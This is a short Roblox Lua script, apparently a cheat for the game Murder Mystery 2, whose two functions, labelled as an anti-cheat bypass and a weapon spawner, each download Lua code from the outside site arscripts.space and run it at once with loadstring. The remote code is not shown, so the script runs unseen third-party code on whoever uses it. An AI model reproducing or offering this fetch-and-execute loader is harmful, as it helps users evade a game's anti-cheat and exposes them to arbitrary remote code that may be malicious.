local function BypassAntiCheat()
        loadstring(game:HttpGet("https://arscripts.space/MM2SCRIPT"))()
end
local function MM2Spawner()
        loadstring(game:HttpGet("https://arscripts.space/MM2WeaponSpawnerScript/MM2SCRIPT.lua", true))()
end
task.spawn(BypassAntiCheat)
task.spawn(MM2Spawner)
